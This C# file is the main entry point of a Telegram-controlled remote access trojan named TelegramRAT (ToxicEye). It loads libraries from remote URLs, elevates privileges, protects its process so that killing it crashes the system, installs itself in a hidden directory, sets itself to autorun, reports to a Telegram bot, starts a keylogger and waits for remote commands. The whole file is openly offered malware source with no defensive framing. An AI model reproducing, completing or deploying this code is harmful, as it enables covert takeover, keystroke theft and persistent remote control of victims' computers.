using System.Net;

namespace TelegramRAT
{
    class Program
    {
        [System.STAThreadAttribute]
        static void Main(string[] args)
        {

            // Load libraries
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/Newtonsoft.Json.dll");
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/Telegram.Bot.dll");

            // SSL
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            // Get admin rights
            persistense.elevatePrevileges();
            // Protect process (BSOD)
            persistense.protectProcess();
            // Install to system & hide directory
            persistense.installSelf();
            // Add to startup
            persistense.setAutorun();
            // Send 'online' to telegram bot
            telegram.sendConnection();
            // Start offline keylogger
            utils.keyloggerThread.Start();
            // Wait for new commands
            telegram.waitCommands();
            // Lock main thread
            while (true) { System.Threading.Thread.Sleep(10000);  }
        }
    }
}
